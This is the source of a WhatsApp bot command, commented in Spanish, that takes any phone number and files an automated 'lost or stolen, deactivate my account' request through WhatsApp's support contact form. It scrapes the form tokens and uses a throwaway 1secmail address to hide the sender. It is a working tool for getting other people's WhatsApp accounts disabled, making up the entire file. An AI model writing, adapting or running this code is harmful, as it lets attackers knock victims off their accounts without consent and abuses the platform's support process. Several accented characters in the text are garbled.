import cheerio from 'cheerio';
import axios from 'axios';
import util from 'util';

const handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
  try {
    const q = args.join(' ');
    if (!q || !args[0]) throw '*[Error: El n¨²mero de tel¨¦fono es requerido]*';
    
    // Obtener la p¨¢gina de contacto de WhatsApp
    const ntah = await axios.get('https://www.whatsapp.com/contact/noclient/');
    // Obtener un correo electr¨®nico temporal
    const email = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10');
    
    const cookie = ntah.headers['set-cookie'].join('; ');
    const $ = cheerio.load(ntah.data);
    const $form = $('form');

    const url = new URL($form.attr('action'), 'https://www.whatsapp.com').href;
    const form = new URLSearchParams();
    // Agregar los par¨¢metros necesarios
    form.append('jazoest', $form.find('input[name=jazoest]').val());
    form.append('lsd', $form.find('input[name=lsd]').val());
    form.append('step', 'submit');
    form.append('country_selector', 'ID');
    form.append('phone_number', q);
    form.append('email', email.data[0]);
    form.append('email_confirm', email.data[0]);
    form.append('platform', 'ANDROID');
    form.append('your_message', 'Perdido/roubado: desative minha conta: ' + q);
    form.append('__user', '0');
    form.append('__a', '1');
    form.append('__csr', '');
    form.append('__req', '8');
    form.append('__hs', '19316.BP:whatsapp_www_pkg.2.0.0.0.0');
    form.append('dpr', '1');
    form.append('__ccg', 'UNKNOWN');
    form.append('__rev', '1006630858');
    form.append('__comment_req', '0');
    
    // Realizar la petici¨®n POST
    const res = await axios({ url, method: 'POST', data: form, headers: { cookie } });
    
    const payload = String(res.data);
    if (payload.includes(`"payload":true`)) {
      m.reply(`##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta est¨¢ deshabilitada temporalmente y se eliminar¨¢ autom¨¢ticamente en 30 d¨ªas si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atenci¨®n al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el per¨ªodo de cierre:\n - Es posible que sus contactos en WhatsApp a¨²n vean su nombre y foto de perfil.\n - Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecer¨¢ en estado pendiente por hasta 30 d¨ªas.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el c¨®digo de 6 d¨ªgitos que recibe por SMS o llamada telef¨®nica. Si te vuelves a registrar\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`);
    } else if (payload.includes(`"payload":false`)) {
      m.reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este n¨²mero de tel¨¦fono te pertenece. Por favor, env¨ªanos documentaci¨®n que nos permita verificar que el n¨²mero es de tu propiedad, como una copia de la factura telef¨®nica o el contrato de servicio.\n\nPor favor, aseg¨²rate de ingresar tu n¨²mero de tel¨¦fono en formato internacional completo. Para obtener m¨¢s informaci¨®n sobre el formato internacional, consulta este art¨ªculo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`);
    } else {
      m.reply(util.format(JSON.parse(res.data.replace('for (;;);', ''))));
    }
  } catch (error) {
    console.error(error);
    m.reply('*[Error: Ocurri¨® un problema al procesar tu solicitud.]*');
  }
};

handler.command = /^(supportwa|swa|soporte|support|desactivarwa|mandsupport)$/i;
handler.rowner = true;

export default handler;